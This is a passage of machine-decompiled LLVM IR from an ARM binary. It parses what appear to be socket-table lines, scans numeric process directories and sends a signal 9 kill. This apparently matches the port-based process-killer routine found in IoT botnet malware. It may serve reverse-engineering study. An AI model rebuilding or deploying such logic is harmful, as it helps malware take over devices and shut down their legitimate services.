  %v4_e614 = call i32 @function_12fc8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_157a0.99, i32 0, i32 0), i32 %v0_e610)
  %v7_e618 = icmp eq i32 %v4_e614, -1
  store i32 %v4_e614, i32* @r8, align 4
  br i1 %v7_e618, label %dec_label_pc_ea40, label %dec_label_pc_e624.preheader

dec_label_pc_e624.preheader:                      ; preds = %dec_label_pc_e5f4
  %v4_e63058 = call i32 @function_12734(i8* nonnull %stack_var_-581, i32 512, i32 %v4_e614)
  %v2_e63460 = icmp eq i32 %v4_e63058, 0
  br i1 %v2_e63460, label %dec_label_pc_e7c4.loopexit, label %dec_label_pc_e63c.lr.ph

dec_label_pc_e63c.lr.ph:                          ; preds = %dec_label_pc_e624.preheader
  %v2_e684 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_e63c

dec_label_pc_e63c:                                ; preds = %dec_label_pc_e63c.lr.ph, %dec_label_pc_e624.backedge
  %v3_e640 = load i8, i8* %stack_var_-581, align 1
  %v4_e640 = sext i8 %v3_e640 to i32
  %v2_e644 = icmp eq i8 %v3_e640, 0
  br i1 %v2_e644, label %bb130, label %bb

bb:                                               ; preds = %dec_label_pc_e63c
  %v8_e648 = icmp eq i8 %v3_e640, 58
  br i1 %v8_e648, label %.thread6, label %dec_label_pc_e65c

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_e674

bb130:                                            ; preds = %dec_label_pc_e63c
  br label %dec_label_pc_e674

dec_label_pc_e65c:                                ; preds = %bb
  %v1_e664.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_e660

dec_label_pc_e660:                                ; preds = %bb131, %dec_label_pc_e65c
  %v0_e660 = phi i32 [ %v1_e660, %bb131 ], [ 0, %dec_label_pc_e65c ]
  %v1_e660 = add i32 %v0_e660, 1
  %v2_e664 = add i32 %v1_e660, %v1_e664.pre
  %v3_e664 = inttoptr i32 %v2_e664 to i8*
  %v4_e664 = load i8, i8* %v3_e664, align 1
  %v6_e664 = zext i8 %v4_e664 to i32
  %v2_e668 = icmp eq i8 %v4_e664, 0
  br i1 %v2_e668, label %dec_label_pc_e674, label %bb131

bb131:                                            ; preds = %dec_label_pc_e660
  %v8_e66c = icmp eq i8 %v4_e664, 58
  br i1 %v8_e66c, label %dec_label_pc_e674, label %dec_label_pc_e660

dec_label_pc_e674:                                ; preds = %dec_label_pc_e660, %bb131, %bb130, %.thread6
  %v1_e6a0 = phi i32 [ 0, %.thread6 ], [ 0, %bb130 ], [ %v1_e660, %bb131 ], [ %v1_e660, %dec_label_pc_e660 ]
  %v0_e674 = phi i32 [ %v4_e640, %.thread6 ], [ %v4_e640, %bb130 ], [ %v6_e664, %bb131 ], [ %v6_e664, %dec_label_pc_e660 ]
  %v2_e674 = icmp eq i32 %v0_e674, 0
  br i1 %v2_e674, label %dec_label_pc_e624.backedge, label %dec_label_pc_e67c

dec_label_pc_e624.backedge:                       ; preds = %dec_label_pc_e674, %dec_label_pc_e74c, %dec_label_pc_e798, %dec_label_pc_e6c0
  %v0_e62c = load i32, i32* @r8, align 4
  %v4_e630 = call i32 @function_12734(i8* nonnull %stack_var_-581, i32 512, i32 %v0_e62c)
  %v2_e634 = icmp eq i32 %v4_e630, 0
  br i1 %v2_e634, label %dec_label_pc_e7c4.loopexit, label %dec_label_pc_e63c

dec_label_pc_e67c:                                ; preds = %dec_label_pc_e674
  %v1_e680 = add i32 %v1_e6a0, 2
  %v2_e688 = add i32 %v1_e680, %v2_e684
  %v1_e68c = add i32 %v2_e688, -545
  %v2_e68c = inttoptr i32 %v1_e68c to i8*
  %v3_e68c = load i8, i8* %v2_e68c, align 1
  %v2_e690 = icmp eq i8 %v3_e68c, 0
  br i1 %v2_e690, label %bb133, label %bb132

bb132:                                            ; preds = %dec_label_pc_e67c
  %v8_e694 = icmp eq i8 %v3_e68c, 32
  br i1 %v8_e694, label %.thread10, label %dec_label_pc_e6a0

.thread10:                                        ; preds = %bb132
  store i32 %v1_e680, i32* @r5, align 4
  br label %dec_label_pc_e6c0

bb133:                                            ; preds = %dec_label_pc_e67c
  store i32 %v1_e680, i32* @r5, align 4
  br label %dec_label_pc_e6c0

dec_label_pc_e6a0:                                ; preds = %bb132
  %v0_e6a0 = load i32, i32* @r6, align 4
  %v2_e6a0 = add i32 %v0_e6a0, %v1_e6a0
  br label %dec_label_pc_e6a4

dec_label_pc_e6a4:                                ; preds = %bb134, %dec_label_pc_e6a0
  %v0_e6b013 = phi i32 [ %v1_e6b0, %bb134 ], [ %v2_e6a0, %dec_label_pc_e6a0 ]
  %v1_e6a4 = add i32 %v0_e6b013, 3
  %v2_e6a4 = inttoptr i32 %v1_e6a4 to i8*
  %v3_e6a4 = load i8, i8* %v2_e6a4, align 1
  %v2_e6a8 = icmp eq i8 %v3_e6a4, 0
  br i1 %v2_e6a8, label %.thread12, label %bb134

.thread12:                                        ; preds = %dec_label_pc_e6a4
  %v1_e6b014 = add i32 %v0_e6b013, 1
  br label %dec_label_pc_e6b8

bb134:                                            ; preds = %dec_label_pc_e6a4
  %v8_e6ac = icmp eq i8 %v3_e6a4, 32
  %v1_e6b0 = add i32 %v0_e6b013, 1
  br i1 %v8_e6ac, label %dec_label_pc_e6b8, label %dec_label_pc_e6a4

dec_label_pc_e6b8:                                ; preds = %bb134, %.thread12
  %v1_e6b015 = phi i32 [ %v1_e6b014, %.thread12 ], [ %v1_e6b0, %bb134 ]
  %v2_e6b8 = sub i32 %v1_e6b015, %v0_e6a0
  %v1_e6bc = add i32 %v2_e6b8, 2
  store i32 %v1_e6bc, i32* @r5, align 4
  br label %dec_label_pc_e6c0

dec_label_pc_e6c0:                                ; preds = %bb133, %.thread10, %dec_label_pc_e6b8
  %v1_e6cc = phi i32 [ %v1_e680, %.thread10 ], [ %v1_e680, %bb133 ], [ %v1_e6bc, %dec_label_pc_e6b8 ]
  %v0_e6c0 = load i32, i32* @r6, align 4
  %v2_e6c0 = add i32 %v0_e6c0, %v1_e680
  store i32 %v2_e6c0, i32* @r4, align 4
  %v2_e6cc = add i32 %v1_e6cc, %v2_e684
  store i32 0, i32* @r7, align 4
  %v3_e6d8 = add i32 %v2_e6cc, -545
  %v4_e6d8 = inttoptr i32 %v3_e6d8 to i8*
  store i8 0, i8* %v4_e6d8, align 1
  %v1_e6dc = inttoptr i32 %v2_e6c0 to i8*
  %v2_e6dc = call i32 @function_124dc(i8* %v1_e6dc)
  store i32 %v2_e6dc, i32* @r1, align 4
  %v0_e6e8 = load i32, i32* @r4, align 4
  %v3_e6ec = inttoptr i32 %v0_e6e8 to i8*
  %v4_e6ec = call i32 @function_12830(i8* %v3_e6ec, i32 %v2_e6dc, i32 %v2_e5b8)
  %v7_e6f0 = icmp eq i32 %v4_e6ec, -1
  br i1 %v7_e6f0, label %dec_label_pc_e624.backedge, label %dec_label_pc_e70c.preheader

dec_label_pc_e70c.preheader:                      ; preds = %dec_label_pc_e6c0
  %v1_e6f4 = load i32, i32* @r7, align 4
  %v1_e6f8 = load i32, i32* @r6, align 4
  %v2_e6f8 = load i32, i32* @r5, align 4
  %v3_e6f8 = add i32 %v2_e6f8, %v1_e6f8
  store i32 %v1_e6f4, i32* @lr, align 4
  store i32 %v1_e6f4, i32* @r4, align 4
  %v1_e70c50 = add i32 %v3_e6f8, 2
  %v2_e70c51 = inttoptr i32 %v1_e70c50 to i8*
  %v3_e70c52 = load i8, i8* %v2_e70c51, align 1
  %v2_e71054 = icmp eq i8 %v3_e70c52, 0
  %v1_e71456 = add i32 %v2_e6f8, 2
  br i1 %v2_e71054, label %dec_label_pc_e74c, label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %dec_label_pc_e70c.preheader, %dec_label_pc_e70c.backedge
  %v0_e74c86 = phi i32 [ %v0_e74c85, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_e734.pr = phi i32 [ %v0_e734.pr71, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_ea50 = phi i32 [ %v0_ea5074, %dec_label_pc_e70c.backedge ], [ %v1_e6f4, %dec_label_pc_e70c.preheader ]
  %v0_e71482 = phi i32 [ %v1_e714, %dec_label_pc_e70c.backedge ], [ %v1_e71456, %dec_label_pc_e70c.preheader ]
  %v0_e744 = phi i32 [ %v0_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e6f8, %dec_label_pc_e70c.preheader ]
  %v1_e720.in = phi i8 [ %v3_e70c, %dec_label_pc_e70c.backedge ], [ %v3_e70c52, %dec_label_pc_e70c.preheader ]
  %v7_e71c = icmp eq i8 %v1_e720.in, 9
  br i1 %v7_e71c, label %.thread23, label %bb135

bb135:                                            ; preds = %dec_label_pc_e71c
  %v8_e720 = icmp eq i8 %v1_e720.in, 32
  br i1 %v8_e720, label %.thread23.thread35, label %dec_label_pc_e734

.thread23.thread35:                               ; preds = %bb135
  br label %dec_label_pc_e740

.thread23:                                        ; preds = %dec_label_pc_e71c
  br label %dec_label_pc_e740

dec_label_pc_e734:                                ; preds = %bb135
  %v7_e734 = icmp eq i32 %v0_e734.pr, 1
  br i1 %v7_e734, label %dec_label_pc_ea50, label %dec_label_pc_e73c

dec_label_pc_e73c:                                ; preds = %dec_label_pc_ea50, %dec_label_pc_e734
  %v0_e74079 = phi i32 [ %v1_ea50, %dec_label_pc_ea50 ], [ %v0_ea50, %dec_label_pc_e734 ]
  br label %dec_label_pc_e740

dec_label_pc_e740:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_e73c
  %v0_e740 = phi i32 [ %v0_ea50, %.thread23.thread35 ], [ %v0_ea50, %.thread23 ], [ %v0_e74079, %dec_label_pc_e73c ]
  %v0_e734.pr72 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_e73c ]
  %v7_e748 = icmp sgt i32 %v0_e740, 6
  br i1 %v7_e748, label %dec_label_pc_e74c, label %dec_label_pc_e70c.backedge

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e70c.backedge, %dec_label_pc_e740, %dec_label_pc_e70c.preheader
  %v1_e79c = phi i32 [ %v1_e71456, %dec_label_pc_e70c.preheader ], [ %v1_e714, %dec_label_pc_e70c.backedge ], [ %v0_e71482, %dec_label_pc_e740 ]
  %v0_e74c = phi i32 [ %v1_e6f4, %dec_label_pc_e70c.preheader ], [ %v0_e74c85, %dec_label_pc_e70c.backedge ], [ %v0_e74c86, %dec_label_pc_e740 ]
  %v2_e74c = icmp eq i32 %v0_e74c, 0
  br i1 %v2_e74c, label %dec_label_pc_e624.backedge, label %dec_label_pc_e758

dec_label_pc_e758:                                ; preds = %dec_label_pc_e74c
  %v2_e760 = add i32 %v1_e79c, %v2_e684
  %v1_e764 = add i32 %v2_e760, -545
  %v2_e764 = inttoptr i32 %v1_e764 to i8*
  %v3_e764 = load i8, i8* %v2_e764, align 1
  %v2_e768 = icmp eq i8 %v3_e764, 0
  br i1 %v2_e768, label %dec_label_pc_e798, label %bb136

bb136:                                            ; preds = %dec_label_pc_e758
  %v8_e76c = icmp eq i8 %v3_e764, 32
  br i1 %v8_e76c, label %dec_label_pc_e798, label %dec_label_pc_e774

dec_label_pc_e774:                                ; preds = %bb136
  %v2_e774 = add i32 %v1_e79c, %v1_e6f8
  br label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %bb137, %dec_label_pc_e774
  %v0_e78428 = phi i32 [ %v1_e784, %bb137 ], [ %v1_e79c, %dec_label_pc_e774 ]
  %v0_e778 = phi i32 [ %v1_e778, %bb137 ], [ %v2_e774, %dec_label_pc_e774 ]
  %v1_e778 = add i32 %v0_e778, 1
  %v2_e778 = inttoptr i32 %v1_e778 to i8*
  %v3_e778 = load i8, i8* %v2_e778, align 1
  %v2_e77c = icmp eq i8 %v3_e778, 0
  br i1 %v2_e77c, label %.thread27, label %bb137

.thread27:                                        ; preds = %dec_label_pc_e778
  %v1_e78429 = add i32 %v0_e78428, 1
  br label %dec_label_pc_e78c

bb137:                                            ; preds = %dec_label_pc_e778
  %v8_e780 = icmp eq i8 %v3_e778, 32
  %v1_e784 = add i32 %v0_e78428, 1
  br i1 %v8_e780, label %dec_label_pc_e78c, label %dec_label_pc_e778

dec_label_pc_e78c:                                ; preds = %bb137, %.thread27
  %v1_e794 = phi i32 [ %v1_e78429, %.thread27 ], [ %v1_e784, %bb137 ]
  %v2_e794 = add i32 %v1_e794, %v2_e684
  br label %dec_label_pc_e798

dec_label_pc_e798:                                ; preds = %dec_label_pc_e758, %bb136, %dec_label_pc_e78c
  %v2_e7a4 = phi i32 [ %v2_e760, %dec_label_pc_e758 ], [ %v2_e760, %bb136 ], [ %v2_e794, %dec_label_pc_e78c ]
  %v2_e79c = add i32 %v1_e79c, %v1_e6f8
  store i32 %v2_e79c, i32* @r4, align 4
  %v3_e7a4 = add i32 %v2_e7a4, -545
  %v4_e7a4 = inttoptr i32 %v3_e7a4 to i8*
  store i8 0, i8* %v4_e7a4, align 1
  %v1_e7a8 = inttoptr i32 %v2_e79c to i8*
  %v2_e7a8 = call i32 @function_124dc(i8* %v1_e7a8)
  %v8_e7b0 = icmp sgt i32 %v2_e7a8, 15
  br i1 %v8_e7b0, label %dec_label_pc_e624.backedge, label %dec_label_pc_e7b4

dec_label_pc_e7b4:                                ; preds = %dec_label_pc_e798
  %v0_e7b8 = load i32, i32* @r4, align 4
  %v2_e7bc = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e7bc, i32* @r0, align 4
  %v2_e7c0 = bitcast i32* %stack_var_-52 to i8*
  %v3_e7c0 = call i32 @function_12504(i8* %v2_e7c0, i32 %v0_e7b8)
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4.loopexit:                       ; preds = %dec_label_pc_e624.backedge, %dec_label_pc_e624.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre99 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_e7c4

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e7c4.loopexit, %dec_label_pc_e7b4
  %v1_e7d4.pre-phi = phi i8* [ %.pre99, %dec_label_pc_e7c4.loopexit ], [ %v2_e7c0, %dec_label_pc_e7b4 ]
  %v2_e7d0.pre-phi = phi i32 [ %.pre, %dec_label_pc_e7c4.loopexit ], [ %v2_e7bc, %dec_label_pc_e7b4 ]
  %v0_e7c4 = load i32, i32* @r8, align 4
  %v1_e7c8 = call i32 @function_12e9c(i32 %v0_e7c4)
  %v2_e7d4 = call i32 @function_124dc(i8* %v1_e7d4.pre-phi)
  store i32 %v2_e7d4, i32* @r4, align 4
  %v2_e7d8 = icmp eq i32 %v2_e7d4, 0
  br i1 %v2_e7d8, label %dec_label_pc_ea28, label %dec_label_pc_e7e0

dec_label_pc_e7e0:                                ; preds = %dec_label_pc_e7c4
  %v3_e7e8 = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v3_e7e8, i32* @r0, align 4
  %v1_e7ec = call i32 @function_132a4(i32 %v3_e7e8)
  store i32 %v1_e7ec, i32* @r8, align 4
  %v2_e7f0 = icmp eq i32 %v1_e7ec, 0
  br i1 %v2_e7f0, label %dec_label_pc_ea20, label %dec_label_pc_e800.preheader

dec_label_pc_e800.preheader:                      ; preds = %dec_label_pc_e7e0
  store i32 0, i32* @r5, align 4
  %v1_e80445 = inttoptr i32 %v1_e7ec to i32*
  %v2_e80446 = call i32 @function_133a0(i32* %v1_e80445)
  %v2_e80848 = icmp eq i32 %v2_e80446, 0
  br i1 %v2_e80848, label %dec_label_pc_ea14, label %dec_label_pc_e810.preheader

dec_label_pc_e800.loopexit:                       ; preds = %dec_label_pc_e818, %dec_label_pc_e82c, %dec_label_pc_e894
  %v0_e800 = load i32, i32* @r8, align 4
  %v1_e804 = inttoptr i32 %v0_e800 to i32*
  %v2_e804 = call i32 @function_133a0(i32* %v1_e804)
  %v2_e808 = icmp eq i32 %v2_e804, 0
  br i1 %v2_e808, label %dec_label_pc_ea14, label %dec_label_pc_e810.preheader

dec_label_pc_e810.preheader:                      ; preds = %dec_label_pc_e800.preheader, %dec_label_pc_e800.loopexit
  %v0_e81894 = phi i32 [ %v2_e804, %dec_label_pc_e800.loopexit ], [ %v2_e80446, %dec_label_pc_e800.preheader ]
  br label %dec_label_pc_e810

dec_label_pc_e810:                                ; preds = %dec_label_pc_e810.preheader, %dec_label_pc_e9fc
  %v0_e824 = phi i32 [ %v0_e81894, %dec_label_pc_e810.preheader ], [ %v2_ea08, %dec_label_pc_e9fc ]
  %v0_e810 = load i32, i32* @r5, align 4
  %v2_e810 = icmp eq i32 %v0_e810, 0
  br i1 %v2_e810, label %dec_label_pc_e818, label %dec_label_pc_ea14

dec_label_pc_e818:                                ; preds = %dec_label_pc_e810
  %v1_e818 = add i32 %v0_e824, 11
  %v2_e818 = inttoptr i32 %v1_e818 to i8*
  %v3_e818 = load i8, i8* %v2_e818, align 1
  %v4_e818 = zext i8 %v3_e818 to i32
  %v1_e81c = add nsw i32 %v4_e818, -48
  store i32 %v1_e818, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_e81c, 9
  br i1 %tmp, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e82c

dec_label_pc_e82c:                                ; preds = %dec_label_pc_e818
  %v3_e834 = call i32 @function_11b24(i32 6, i32* null)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e840 = call i32 @function_12504(i8* %v2_e578, i32 %v3_e834)
  %v2_e848 = call i32 @function_124dc(i8* %v2_e578)
  %v0_e84c = load i32, i32* @r7, align 4
  %v0_e850 = load i32, i32* @sl, align 4
  %v2_e850 = add i32 %v0_e850, %v2_e848
  store i32 %v2_e850, i32* @r0, align 4
  %v2_e854 = inttoptr i32 %v2_e850 to i8*
  %v3_e854 = call i32 @function_12504(i8* %v2_e854, i32 %v0_e84c)
  %v2_e85c = call i32 @function_124dc(i8* %v2_e578)
  %v0_e860 = load i32, i32* @r5, align 4
  store i32 %v2_e85c, i32* @r4, align 4
  %v2_e86c = inttoptr i32 %v0_e860 to i32*
  %v3_e86c = call i32 @function_11b24(i32 7, i32* %v2_e86c)
  %v0_e874 = load i32, i32* @sl, align 4
  %v1_e874 = load i32, i32* @r4, align 4
  %v2_e874 = add i32 %v1_e874, %v0_e874
  store i32 %v2_e874, i32* @r0, align 4
  %v2_e878 = inttoptr i32 %v2_e874 to i8*
  %v3_e878 = call i32 @function_12504(i8* %v2_e878, i32 %v3_e86c)
  %v4_e888 = call i32 @function_13090(i8* %v2_e578, i32 %v2_e56c, i32 4096)
  %v7_e88c = icmp eq i32 %v4_e888, -1
  br i1 %v7_e88c, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_e82c
  %v0_e894 = load i32, i32* @r5, align 4
  %v2_e89c = inttoptr i32 %v0_e894 to i32*
  %v3_e89c = call i32 @function_11b24(i32 6, i32* %v2_e89c)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e8a8 = call i32 @function_12504(i8* %v2_e578, i32 %v3_e89c)
  %v2_e8b0 = call i32 @function_124dc(i8* %v2_e578)
  %v0_e8b4 = load i32, i32* @r7, align 4
  %v0_e8b8 = load i32, i32* @sl, align 4
  %v2_e8b8 = add i32 %v0_e8b8, %v2_e8b0
  store i32 %v2_e8b8, i32* @r0, align 4
  %v2_e8bc = inttoptr i32 %v2_e8b8 to i8*
  %v3_e8bc = call i32 @function_12504(i8* %v2_e8bc, i32 %v0_e8b4)
  %v2_e8c4 = call i32 @function_124dc(i8* %v2_e578)
  %v0_e8c8 = load i32, i32* @r5, align 4
  store i32 %v2_e8c4, i32* @r4, align 4
  %v2_e8d4 = inttoptr i32 %v0_e8c8 to i32*
  %v3_e8d4 = call i32 @function_11b24(i32 9, i32* %v2_e8d4)
  %v0_e8dc = load i32, i32* @sl, align 4
  %v1_e8dc = load i32, i32* @r4, align 4
  %v2_e8dc = add i32 %v1_e8dc, %v0_e8dc
  store i32 %v2_e8dc, i32* @r0, align 4
  %v2_e8e0 = inttoptr i32 %v2_e8dc to i8*
  %v3_e8e0 = call i32 @function_12504(i8* %v2_e8e0, i32 %v3_e8d4)
  store i32 %v2_e558, i32* @r0, align 4
  %v1_e8e8 = call i32 @function_132a4(i32 %v2_e558)
  store i32 %v1_e8e8, i32* @sb, align 4
  %v2_e8ec = icmp eq i32 %v1_e8e8, 0
  br i1 %v2_e8ec, label %dec_label_pc_e800.loopexit, label %dec_label_pc_e8f4.preheader

dec_label_pc_e8f4.preheader:                      ; preds = %dec_label_pc_e894
  %v1_e8f840 = inttoptr i32 %v1_e8e8 to i32*
  %v2_e8f841 = call i32 @function_133a0(i32* %v1_e8f840)
  store i32 %v2_e8f841, i32* @r6, align 4
  %v2_e8fc43 = icmp eq i32 %v2_e8f841, 0
  br i1 %v2_e8fc43, label %dec_label_pc_e9fc, label %dec_label_pc_e90cthread-pre-split

dec_label_pc_e8f4.loopexit:                       ; preds = %dec_label_pc_e914, %dec_label_pc_e9ac
  %v0_e8f4 = load i32, i32* @sb, align 4
  %v1_e8f8 = inttoptr i32 %v0_e8f4 to i32*
  %v2_e8f8 = call i32 @function_133a0(i32* %v1_e8f8)
  store i32 %v2_e8f8, i32* @r6, align 4
  %v2_e8fc = icmp eq i32 %v2_e8f8, 0
  br i1 %v2_e8fc, label %dec_label_pc_e9fc, label %dec_label_pc_e90cthread-pre-split

dec_label_pc_e90cthread-pre-split:                ; preds = %dec_label_pc_e8f4.preheader, %dec_label_pc_e8f4.loopexit
  %v0_e90c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_e90c

dec_label_pc_e90c:                                ; preds = %dec_label_pc_e90cthread-pre-split, %dec_label_pc_e9d4
  %v0_e90c = phi i32 [ %v0_e90c.pr, %dec_label_pc_e90cthread-pre-split ], [ 1, %dec_label_pc_e9d4 ]
  %v2_e90c = icmp eq i32 %v0_e90c, 0
  br i1 %v2_e90c, label %dec_label_pc_e914, label %dec_label_pc_e9fc

dec_label_pc_e914:                                ; preds = %dec_label_pc_e90c
  %v2_e914 = call i32 @function_1257c(i32 %v2_e56c, i32 4096)
  %v0_e918 = load i32, i32* @r5, align 4
  %v2_e920 = inttoptr i32 %v0_e918 to i32*
  %v3_e920 = call i32 @function_11b24(i32 6, i32* %v2_e920)
  store i32 %v2_e558, i32* @r0, align 4
  %v3_e92c = call i32 @function_12504(i8* %v2_e578, i32 %v3_e920)
  %v2_e934 = call i32 @function_124dc(i8* %v2_e578)
  %v0_e938 = load i32, i32* @r7, align 4
  %v0_e93c = load i32, i32* @sl, align 4
  %v2_e93c = add i32 %v0_e93c, %v2_e934
  store i32 %v2_e93c, i32* @r0, align 4
  %v2_e940 = inttoptr i32 %v2_e93c to i8*
  %v3_e940 = call i32 @function_12504(i8* %v2_e940, i32 %v0_e938)
  %v2_e948 = call i32 @function_124dc(i8* %v2_e578)
  %v0_e94c = load i32, i32* @r5, align 4
  store i32 %v2_e948, i32* @r4, align 4
  %v2_e958 = inttoptr i32 %v0_e94c to i32*
  %v3_e958 = call i32 @function_11b24(i32 9, i32* %v2_e958)
  %v0_e960 = load i32, i32* @sl, align 4
  %v1_e960 = load i32, i32* @r4, align 4
  %v2_e960 = add i32 %v1_e960, %v0_e960
  store i32 %v2_e960, i32* @r0, align 4
  %v2_e964 = inttoptr i32 %v2_e960 to i8*
  %v3_e964 = call i32 @function_12504(i8* %v2_e964, i32 %v3_e958)
  %v2_e96c = call i32 @function_124dc(i8* %v2_e578)
  %v0_e974 = load i32, i32* @sl, align 4
  %v2_e974 = add i32 %v0_e974, %v2_e96c
  store i32 %v2_e974, i32* @r0, align 4
  %v2_e978 = inttoptr i32 %v2_e974 to i8*
  %v3_e978 = call i32 @function_12504(i8* %v2_e978, i32 ptrtoint ([2 x i8]* @global_var_15760.23 to i32))
  %v2_e980 = call i32 @function_124dc(i8* %v2_e578)
  %v0_e984 = load i32, i32* @r6, align 4
  %v1_e984 = add i32 %v0_e984, 11
  %v0_e988 = load i32, i32* @sl, align 4
  %v2_e988 = add i32 %v0_e988, %v2_e980
  store i32 %v2_e988, i32* @r0, align 4
  %v2_e98c = inttoptr i32 %v2_e988 to i8*
  %v3_e98c = call i32 @function_12504(i8* %v2_e98c, i32 %v1_e984)
  %v4_e99c = call i32 @function_13090(i8* %v2_e578, i32 %v2_e56c, i32 4096)
  %v7_e9a0 = icmp eq i32 %v4_e99c, -1
  br i1 %v7_e9a0, label %dec_label_pc_e8f4.loopexit, label %dec_label_pc_e9ac

dec_label_pc_e9ac:                                ; preds = %dec_label_pc_e914
  %v2_e9ac = call i32 @function_124dc(i8* %v2_e590)
  store i32 %v2_e9ac, i32* @r1, align 4
  %v4_e9c0 = call i32 @function_12830(i8* %v2_e590, i32 %v2_e9ac, i32 %v2_e7d0.pre-phi)
  %v7_e9c4 = icmp eq i32 %v4_e9c0, -1
  br i1 %v7_e9c4, label %dec_label_pc_e8f4.loopexit, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9ac
  %v0_e9cc = load i32, i32* @r7, align 4
  %v2_e9d4 = inttoptr i32 %v0_e9cc to i8*
  %v3_e9d4 = call i32 @function_12608(i8* %v2_e9d4, i32 10)
  %v2_e9dc = call i32 @function_12f9c(i32 %v3_e9d4, i32 9)
  %v0_e9e0 = load i32, i32* @sb, align 4
  %v1_e9e4 = inttoptr i32 %v0_e9e0 to i32*
  %v2_e9e4 = call i32 @function_133a0(i32* %v1_e9e4)
  store i32 %v2_e9e4, i32* @r6, align 4
  %v2_e9e8 = icmp eq i32 %v2_e9e4, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e9e8, label %dec_label_pc_e9fc, label %dec_label_pc_e90c

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e8f4.loopexit, %dec_label_pc_e9d4, %dec_label_pc_e90c, %dec_label_pc_e8f4.preheader
  %v0_e9fc = load i32, i32* @sb, align 4
  %v1_ea00 = inttoptr i32 %v0_e9fc to i32*
  %v2_ea00 = call i32 @function_131f0(i32* %v1_ea00)
  %v0_ea04 = load i32, i32* @r8, align 4
  %v1_ea08 = inttoptr i32 %v0_ea04 to i32*
  %v2_ea08 = call i32 @function_133a0(i32* %v1_ea08)
  %v2_ea0c = icmp eq i32 %v2_ea08, 0
  br i1 %v2_ea0c, label %dec_label_pc_ea14, label %dec_label_pc_e810

dec_label_pc_ea14:                                ; preds = %dec_label_pc_e800.loopexit, %dec_label_pc_e9fc, %dec_label_pc_e810, %dec_label_pc_e800.preheader
  %v0_ea14 = load i32, i32* @r8, align 4
  %v1_ea18 = inttoptr i32 %v0_ea14 to i32*
  %v2_ea18 = call i32 @function_131f0(i32* %v1_ea18)
  %v0_ea1c = load i32, i32* @r5, align 4
  %v1_ea1c = urem i32 %v0_ea1c, 256
  br label %dec_label_pc_ea20

dec_label_pc_ea20:                                ; preds = %dec_label_pc_e7e0, %dec_label_pc_ea14
  %storemerge = phi i32 [ %v1_ea1c, %dec_label_pc_ea14 ], [ 0, %dec_label_pc_e7e0 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ea24 = call i32 @function_142c4(i32 1)
  br label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_e7c4, %dec_label_pc_ea20
  %v1_ea2c = call i32 @function_11b50(i32 6)
  %v1_ea34 = call i32 @function_11b50(i32 7)
  %v1_ea3c = call i32 @function_11b50(i32 9)
  br label %dec_label_pc_ea40

dec_label_pc_ea40:                                ; preds = %dec_label_pc_e5f4, %dec_label_pc_ea28
  %v0_ea40 = load i32, i32* @r4, align 4
  %v2_ea4c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_ea4c, i32* @r4, align 4
  store i32 %v6_e544, i32* @r5, align 4
  store i32 %v9_e544, i32* @r6, align 4
  store i32 %v12_e544, i32* @r7, align 4
  store i32 %v15_e544, i32* @r8, align 4
  store i32 %v18_e544, i32* @sb, align 4
  store i32 %v21_e544, i32* @sl, align 4
  store i32 %v24_e544, i32* @fp, align 4
  ret i32 %v0_ea40

dec_label_pc_ea50:                                ; preds = %dec_label_pc_e734
  %v1_ea50 = add i32 %v0_ea50, 1
  store i32 %v1_ea50, i32* @lr, align 4
  %v7_ea54 = icmp eq i32 %v0_ea50, 0
  br i1 %v7_ea54, label %dec_label_pc_ea5c, label %dec_label_pc_e73c

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_ea50
  %v1_ea5c = add i32 %v0_e744, 3
  %v2_ea5c = inttoptr i32 %v1_ea5c to i8*
  %v3_ea5c = load i8, i8* %v2_ea5c, align 1
  %v7_ea60 = icmp eq i8 %v3_ea5c, 65
  br i1 %v7_ea60, label %dec_label_pc_ea70, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_ea5c
  br label %dec_label_pc_e70c.backedge

dec_label_pc_ea70:                                ; preds = %dec_label_pc_ea5c
  store i32 %v1_ea50, i32* @r4, align 4
  br label %dec_label_pc_e70c.backedge

dec_label_pc_e70c.backedge:                       ; preds = %.thread33, %dec_label_pc_ea70, %dec_label_pc_e740
  %v0_e74c85 = phi i32 [ %v1_ea50, %dec_label_pc_ea70 ], [ %v0_e74c86, %dec_label_pc_e740 ], [ %v0_e74c86, %.thread33 ]
  %v0_ea5074 = phi i32 [ %v1_ea50, %dec_label_pc_ea70 ], [ %v0_e740, %dec_label_pc_e740 ], [ %v1_ea50, %.thread33 ]
  %v0_e734.pr71 = phi i32 [ 0, %dec_label_pc_ea70 ], [ %v0_e734.pr72, %dec_label_pc_e740 ], [ 0, %.thread33 ]
  %v0_e70c = add i32 %v0_e744, 1
  %v1_e70c = add i32 %v0_e744, 3
